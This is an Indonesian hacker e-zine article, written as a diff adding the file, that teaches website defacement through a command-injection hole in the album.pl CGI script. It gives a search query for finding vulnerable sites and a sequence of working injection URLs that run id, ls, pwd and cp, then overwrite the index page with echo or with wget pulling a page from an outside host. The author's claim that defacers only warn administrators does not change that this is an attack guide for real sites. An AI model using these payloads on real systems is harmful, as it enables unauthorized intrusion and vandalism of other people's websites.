@@ -1,0 +1,199 @@
+
+
+
+	____________________   ___ ___ ________   
+	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+
+
+ECHO-ZINE RELEASE
+       06
+
+Author: m_beben|| m_beben@gawab.com
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+D E F A C I N G   W ! T H    a l b u m . p l
+
+   Assalamu'alaikum wr wb
+   Pa khabar semuanya ??? Penulis doain mudah-mudahan ente-ente semua 
+   sehat-sehat aja dalam lindungan Allah SWT. Amien... !
+
+   Hehehe... ini ke-3 penulis buat artikel yg insya Allah udah dimuat 
+   di dunia maya. Artikel pertama berhubungan dengan registry windows, 
+   kedua tentang pemograman python dan yang ketiga ya ini, 
+   yaitu : DEFACING UNDER ALBUM.PL BUG`S.
+
+   Sebenarnya bug album.pl itu udah lama lho, tetapi ya... entah mengapa
+   masih aja ada yang vuln buat diacak-acak oleh kita-kita ini, ya para 
+   cracker... para defacer... para bugger... para newbiesss..para hacker
+   ... para lamerzzz... para... pokoke para-para yang suka dengan bug-bug 
+   dech !!! Sabodo tuing dengan itu semua, ya gak ?!!!
+
+   Ehmm... ente semua masih sabaran khan denger ocehan ane atau... ente 
+   mulai gatal (maaf) pantat buat segera ber-album.pl ??? Wakakakakakaka
+   .... ente ini bener gak sabaran banget sih ber-album.pl. Ingat bro, 
+   sabar itu disayang Tuhan... wakakakakak !!!!
+
+   Okeh, yang perlu ente siapin buat ngedukung aksi-aksi kita ini adalah :
+
+   -----------------------------------
+   1.Komputer , ente tahu sendiri untuk apa ini ?!!
+   2.Koneksi Internet , nah ini juga kudu musti ada, terserah cara ente 
+     dapatinnya, apa secara legal ato ilegal, tapi tanggung sendiri 
+     akibatnya lho !!! 
+   3.Browser , lah.. lah.. kalo gak ada browser dengan apa ente mo surfing ??? 
+     apa dengan lynx (browser juga sih) ??? wakakaka... ato dengan telnet ??? 
+     ngaco ah !!!
+   4.Susu , ini buat nutrisi protein tubuh. Biar tambah gembrot juga okeh :P~~~
+   5.Cemilan , yah kalo ente-ente suka cemilan ya gak ada salahnya dibawa-bawa 
+     buat ngilangin suntuk ente, kalo gak mau cemilan kue tart bisa juga, 
+     but... apa ente sedang ultah ya ???
+   6.DLL ,  nah ini sih bisa berarti apa aja, misalnya: foto beben yg cihuyy, 
+     ato fotonya aderina yg muanisss banget !!! 
+   ----------------------------------
+
+   Ok, semua perlengkapan perang kita udah lengkap semua khan ??? 
+   Okeh, it`s show time !!!
+
+   Buka browser anda ke alamat: www.google.com lalu ketikkan 
+   keyword: allinurl: album.pl?full=1 atau kalo ente tahu keyword lain 
+   yang bagus silahkan ente berkreasi dengan keyword-keyword ente tersebut.
+   Udah dapat blom target kita ??? ups... banyak banget ya target yang tampil 
+    di jendela si google... but, apakah mereka semua itu vuln ??? ya gak dong 
+   !!! harap dicatet, album.pl yang vurn selama penulis ngetest yaitu : V6.0 
+   ke bawah but perjuangan masih teramat panjang lho.
+
+   Okeh, dapat target kita blom ??? kalo udah, kita sikat aja terus tuh target. 
+   Cara menikmati album.pl ini kudu sungguh-sungguh dengan seluruh ekspresi jiwa kita.
+
+   So, bagaimana cara mengeksploitasi tuh target yang V6.0 ke bawah ??? 
+   Caranya sih mudah aja kok, tinggal tambahin ;configfile=|your unix command here| 
+   ke kotak address IE alamat target kita, misalnya album.pl target kita berada di :
+
+   www.target.com/cgi-bin/album.pl  atau
+   www.target.com/cgi-bin/album.pl?full=1;function=upload
+   nah tinggal kita tambahin aja 
+   www.target.com/cgi-bin/album.pl?full=1;configfile=|ls -la|
+   Gimana, ternyata mudah bukan ???
+
+   Lah terus, gimana dong cara deface-deface yang penulis janjikan itu ??? 
+   Hayoo... buruan share ilmunya ke kita-kita dong !!! 
+   Jangan pelit-pelit macam senior-senior yang lagaknya sok hebat dan sok cool 
+   dengan diem ajee... hayoo... kita-kita para newbiesss dah gak sabaran buat 
+   deface-deface !!!
+
+   Okeh-okeh... sabaran dikit napa sih ?!!!
+   Langkah awal untuk dapat mendeface adalah melihat id kita dengan cara :
+
+   www.target.com/cgi-bin/album.pl?full=1;configfile=|id|
+
+   Apakah id kita cukup untuk menulis di target kita. Terkadang para target 
+   men-set bahwa yang bisa menulis di sana hanyalah user dia sendiri sedangkan 
+   id yang menjalankan apache adalah www. Kita bisa melihat id user yang menulis 
+   di server dengan menggunakan command ls –la, caranya:
+
+   www.target.com/cgi-bin/album.pl?full=1;configfile=|ls -la|
+
+   Lalu kita bandingkan dengan id yang kita dapatkan. So, menurut penulis untuk 
+   deface dengan target yang berbeda antara id yang menulis di server dengan id
+   yang menjalankan server ini buang-buang waktu saja dan cenderung penulis 
+   tinggalkan. Hehehehe... 
+   yang namanya manusia itu khan memang maunya enak aja, apalagi macam kita-kita ini 
+   para newbiesss, para lamerzzz, para script-kiddiesss, para buggerzzz, para... 
+   pokoke para-para maniak dengan defacer deh.
+
+   So, jika kita mendapati id kita sama dengan id yang menulis di server, hehehe... 
+   itu artinya kita mendapatkan harta kirun Jadi tunggu apalagi, 
+   it`s show time for DEFACING !!!
+
+   Langkah kedua yaitu mengecek directory aktif kita dengan cara :
+   www.target.com/cgi-bin/album.pl?full=1;configfile=|pwd|
+
+   Lalu di target kita akan muncul directory aktif kita, misalnya yang muncul adalah 
+   /home/beben/public_html/cgi-bin , nah itu directory aktif kita simpan dulu ato 
+   kita copy dulu. Selanjutnya kita mengecek daftar-daftar di directory public_html 
+   buat ngepastiin apa iya file index-nya di simpan di sana. Kadang penulis temuin 
+   kalo di public_html itu masih ada beberapa directory dan ternyata file index tidak
+   di simpan di sana melainkan di /home/beben/public_html/www nah-nah... 
+
+   jadi itulah gunanya mengecek So, cara ngeceknya gimana ??? Weks, cukup gunain 
+   command ls –la aja kok dikombinasikan dengan directory yang kita dapatkan dengan 
+   command pwd. Contohnya:
+   www.target.com/cgi-bin/album.pl?full=1;configfile=|ls -la /home/beben/public_html|
+
+   Jadi misalnya kita dapatin directory aktif kita di /home/beben/public_html/cgi-bin 
+   maka kita hapusi cgi-bin-nya, kalo directory target kita berada di 
+   /home/beben/public_html/cgi-bin/album maka yang dihapusi /cgi-bin/album-nya 
+   Ngerti khan!!
+
+   Langkah ketiga setelah kita mendapatkan posisi index adalah membackup index itu sendiri. 
+   Sebenarnya ini bukanlah hal wajib namun kudu dibiasain, soalnya kita ini bukanlah perusak, 
+   tugas kita hanyalah mengingatkan admin target bahwa systemnya ada lubang dan bug. Ingat, 
+   itulah tugas utama kita, jadi kita bukan hanya mendeface tanpa alasan demi kepuasan saja, 
+   tetapi mengingatkan admin akan kelemahannya itulah tugas kita. Akan lebih baik lagi kalo 
+   kita memberitahukan di bagian mana dari systemnya yang terdapat lubang .
+
+   Okeh, kita kembali ke channel yang sama masih bersama penulis dalam tema : 
+   DEFACING UNDER album.pl (macam penyiar radio aja yee... ?). Apa tadi lanjutannya... Oh iya, 
+   langkah ketiga adalah membackup indexnya dengan cara menggunakan command cp , 
+   contohnya :
+   www.target.com/cgi-bin/album.pl?full=1;configfile=|cp /home/beben/public_html/index.html             
+   /home/beben/public_html/index.old|
+
+   Gimana, mudah khan... dan langkah keempat adalah... defacing !!! 
+
+   Wakakakaka... ini bagian yang paling penulis nikmati, di sini penulis bisa berkreasi 
+   sepuas penulis untuk mendeface target dengan kata-kata puitis penulis. Untuk cara ini, 
+   penulis sering menggunakan command wget dan command echo. Kelebihan wget dibandingkan 
+   dengan echo adalah... kalo pada wget kita bisa bebas berkreasi, karena kita tinggal 
+   menanam file index kita di hosting gratisan dan tinggal kita wget, but pada echo 
+   penulis cenderung hanya menuliskan sebaris kata-kata saja, misalnya:
+ 
+   m_beben, K-159, the_day, y3d1ps, cyber_error, jaultop, and all op from #kartubeben #e-c-h-o 
+   #aikmel #cloning was here touched your system, so quickly to patch your system.
+
+   Nah, gimana ??? Gak sabaran mo deface yah ??? Okeh, kita mulai dari command echo. 
+   Cara menggunakan command echo yaitu echo  “pesan kita” > <directory index>/index.html, 
+   contohnya :
+   www.target.com/cgi-bin/album.pl?full=1;configfile=|echo “tuliskan pesan anda di sini” >             
+   /home/beben/public_html/index.html|
+
+   Lalu untuk command wget caranya 
+   wget <index yang mau diambil> -O <directory aktif>/index.html, contohnya :
+   
+   www.target.com/cgi-bin/album.pl?full=1;configfile=|wget www.geocities.com/
+   kartubeben/defaced.html -O /home/beben/public_html/index.html|
+
+   Tetapi harap diingat lho, gak selamanya lho file index itu bernama index.html, 
+   terkadang bisa berupa index.htm, default.html, default.htm, home.html, home.htm, 
+   index.asp, index.php, index.shtml, index.cfm, pokoke terserah yang punya target 
+   mo kasih ada nama default index-nya dia. Emang itu urusan penulis !!! 
+
+   Okeh, ada pertanyaan apa enggak ??? Gimana, udah mengerti semuanya khan ??? 
+   Kalo belom ngerti silahkan ente tanya-tanya ke yang ahlinya, kalo ente tanya 
+   ke ane mungkin jawabannya akan berbelit-belit. So, mari bersenang-senang 
+   dengan defacing 
+
+  To be continue... (the matrix)
+  --------------------------
+  Aku, bagian dari kesendirian
+  diamku sepi di pojok sunyi
+  temaram gelap semakin menghitam
+  dilorong-lorong
+  dilabirin-labirin
+  :lolong asa jatuh menggelima
+  Hanyakah aku ?
+  penuntas takdir dilain malam…
+  :ada takdir dalam tiap nafas
+  --------------------------
+
+   Thanks to : K-159 (the person who teaching me), bang yudhax, bang the_day dan y3d1ps, 
+   cyber_error a.k indi, nixell, cengoh_boy, jaultop as farel, btx_45 yang asik bobok aja, 
+   and allcrew of #kartubeben, #e-c-h-o, #aikmel, #postgres, #kahmi,#cloning, #kesawan, 
+   #pahpoh, #ccspower, and all my friends who cannot I said the name.
